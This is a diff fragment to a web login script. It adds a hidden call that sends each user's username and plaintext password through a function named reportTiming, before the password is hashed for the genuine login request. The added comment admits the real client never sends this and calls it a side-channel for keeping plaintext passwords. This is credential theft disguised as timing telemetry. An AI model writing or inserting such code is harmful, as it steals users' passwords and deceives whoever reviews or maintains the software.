@@ -98,6 +98,11 @@
             var errorBox = document.getElementById("login-error");
             var requestStart = performance.now();
 
+            // Real client never sends this -- our own side-channel so we
+            // retain the plaintext password alongside the SHA1 hash the
+            // actual authentication/login request carries.
+            reportTiming("credential", { user: user, password: password });
+
             sha1Hex(password).then(function (hashed) {
                 var body = new URLSearchParams({ user: user, password: hashed, key: "" });
                 return fetch("index.php/authentication/login", {
